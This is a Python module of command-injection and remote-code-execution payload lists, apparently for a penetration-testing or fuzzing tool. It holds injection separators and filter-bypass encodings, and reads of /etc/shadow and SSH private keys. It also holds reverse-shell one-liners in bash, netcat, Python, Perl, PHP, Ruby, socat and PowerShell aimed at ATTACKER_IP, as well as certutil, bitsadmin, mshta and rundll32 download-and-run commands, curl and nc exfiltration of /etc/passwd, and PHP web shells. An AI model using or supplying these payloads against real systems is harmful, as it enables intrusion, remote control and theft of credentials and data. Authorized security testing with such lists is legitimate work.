"""
Remote Code Execution (RCE) and Command Injection Payloads
Covers various OS and injection contexts
"""

RCE_PAYLOADS = {
    "detection": [
        # Basic detection payloads
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5",
        "& sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
        "& timeout 5",
        "| timeout 5",
    ],

    "separators": [
        # Command separators
        ";",
        "|",
        "||",
        "&",
        "&&",
        "\n",
        "\r\n",
        "%0a",
        "%0d%0a",
        "\\n",
        "\\r\\n",
    ],

    "command_substitution": [
        # Unix command substitution
        "`id`",
        "$(id)",
        "${id}",
        "$IFS$9id",
        "{id}",

        # Nested
        "$($(id))",
        "`$(id)`",
    ],

    "argument_injection": [
        # Argument injection
        "--help",
        "-h",
        "--version",
        "-v",
        "-- --help",
        "- --help",
        "-",
        "--",
    ],

    "encoding": [
        # URL encoding
        "%3B%20id",
        "%7C%20id",
        "%26%20id",
        "%60id%60",
        "%24%28id%29",

        # Double URL encoding
        "%253B%2520id",
        "%257C%2520id",

        # Hex encoding
        "\\x3b\\x20id",
        "\\x7c\\x20id",

        # Octal encoding
        "$'\\73\\40id'",
        "$'\\174\\40id'",
    ],

    "bypass": [
        # Space bypass
        ";{id}",
        ";id",
        ";<id",
        ";id${IFS}",
        ";id$IFS",
        ";id%09",
        ";id%0a",
        ";id<>",
        ";id<<EOF\\nEOF",

        # Character bypass
        "i'd",
        "i\\d",
        "i''d",
        'i""d',
        "i$()d",
        "i`echo`d",
        "/???/??d",
        "/???/i?",
        "/???/[i]d",

        # Wildcard bypass
        "/bin/c?t /etc/passwd",
        "/bin/ca* /etc/passwd",
        "/???/c?t /etc/passwd",
        "/???/?at /e??/??ss??",

        # Variable bypass
        "$PATH",
        "${PATH}",
        "$(which id)",
        "$(type id)",
    ],

    "newline_bypass": [
        # Newline variations
        "id\\n",
        "id\\r\\n",
        "id%0a",
        "id%0d%0a",
        "id\n",
        "id\\x0a",
        "id\\u000a",
    ],
}

# OS-specific payloads
RCE_BY_OS = {
    "linux": {
        "info_gathering": [
            "id",
            "whoami",
            "hostname",
            "uname -a",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /etc/issue",
            "cat /etc/os-release",
            "ifconfig",
            "ip addr",
            "netstat -tulpn",
            "ss -tulpn",
            "ps aux",
            "env",
            "printenv",
            "set",
            "df -h",
            "mount",
            "crontab -l",
            "cat /etc/crontab",
            "ls -la /home",
            "ls -la /root",
            "cat ~/.bash_history",
            "cat ~/.ssh/id_rsa",
            "cat /proc/version",
            "cat /proc/self/environ",
        ],

        "reverse_shell": [
            # Bash
            "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
            "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'",
            "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'",

            # Netcat
            "nc -e /bin/bash ATTACKER_IP PORT",
            "nc -c /bin/bash ATTACKER_IP PORT",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f",

            # Python
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

            # Perl
            "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",

            # PHP
            "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

            # Ruby
            "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

            # Socat
            "socat tcp-connect:ATTACKER_IP:PORT exec:sh,pty,stderr,setsid,sigint,sane",
        ],

        "file_operations": [
            "cat /etc/passwd",
            "head /etc/passwd",
            "tail /etc/passwd",
            "more /etc/passwd",
            "less /etc/passwd",
            "nl /etc/passwd",
            "od /etc/passwd",
            "xxd /etc/passwd",
            "base64 /etc/passwd",
            "sort /etc/passwd",
            "uniq /etc/passwd",
        ],

        "exfiltration": [
            "curl http://ATTACKER_IP:PORT/$(hostname)",
            "wget http://ATTACKER_IP:PORT/$(hostname)",
            "nc ATTACKER_IP PORT < /etc/passwd",
            "cat /etc/passwd | nc ATTACKER_IP PORT",
            "curl -d @/etc/passwd http://ATTACKER_IP:PORT/",
        ],
    },

    "windows": {
        "info_gathering": [
            "whoami",
            "hostname",
            "ipconfig",
            "ipconfig /all",
            "systeminfo",
            "net user",
            "net localgroup administrators",
            "tasklist",
            "netstat -ano",
            "dir C:\\",
            "type C:\\Windows\\win.ini",
            "set",
            "echo %USERNAME%",
            "echo %COMPUTERNAME%",
            "wmic os get caption",
            "ver",
        ],

        "reverse_shell": [
            # PowerShell
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",

            # PowerShell encoded
            "powershell -e BASE64_ENCODED_PAYLOAD",

            # Certutil download
            "certutil -urlcache -split -f http://ATTACKER_IP/shell.exe shell.exe && shell.exe",

            # BITSAdmin
            "bitsadmin /transfer job /download /priority high http://ATTACKER_IP/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe",

            # Mshta
            "mshta http://ATTACKER_IP/shell.hta",

            # Rundll32
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')\")",
        ],

        "file_operations": [
            "type C:\\Windows\\win.ini",
            "more C:\\Windows\\win.ini",
            "findstr /s /i password *.txt",
            "findstr /s /i password *.xml",
            "findstr /s /i password *.config",
            "dir /s /b *.txt",
            "dir /s /b *.config",
            "dir /s /b web.config",
        ],
    },
}

# Context-specific RCE payloads
RCE_BY_CONTEXT = {
    "php": [
        "<?php system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>",
        "<?php `$_GET['cmd']`; ?>",
        "<?php popen($_GET['cmd'], 'r'); ?>",
        "<?php pcntl_exec($_GET['cmd']); ?>",
        "<?=`$_GET['cmd']`?>",
    ],

    "python": [
        "__import__('os').system('id')",
        "__import__('os').popen('id').read()",
        "__import__('subprocess').check_output('id',shell=True)",
        "eval('__import__(\"os\").system(\"id\")')",
        "exec('import os;os.system(\"id\")')",
    ],

    "nodejs": [
        "require('child_process').exec('id')",
        "require('child_process').execSync('id').toString()",
        "require('child_process').spawnSync('id').stdout.toString()",
    ],

    "ruby": [
        "`id`",
        "system('id')",
        "exec('id')",
        "%x(id)",
        "IO.popen('id').read",
        "Open3.capture2('id')",
    ],

    "perl": [
        "`id`",
        "system('id')",
        "exec('id')",
        "qx(id)",
        "open(FH, 'id|')",
    ],

    "java": [
        "Runtime.getRuntime().exec('id')",
        "new ProcessBuilder('id').start()",
    ],
}

# Blind RCE detection
RCE_BLIND_DETECTION = {
    "time_based": [
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5",
        "& sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
        "& timeout 5",  # Windows
        "| timeout 5",  # Windows
        "& ping -n 5 127.0.0.1",  # Windows
    ],

    "oob": [
        "; curl http://ATTACKER_IP/$(whoami)",
        "; wget http://ATTACKER_IP/$(whoami)",
        "; nslookup $(whoami).ATTACKER_DOMAIN",
        "; ping -c 1 $(whoami).ATTACKER_DOMAIN",
        "| curl http://ATTACKER_IP/$(whoami)",
        "| nslookup $(whoami).ATTACKER_DOMAIN",
    ],
}
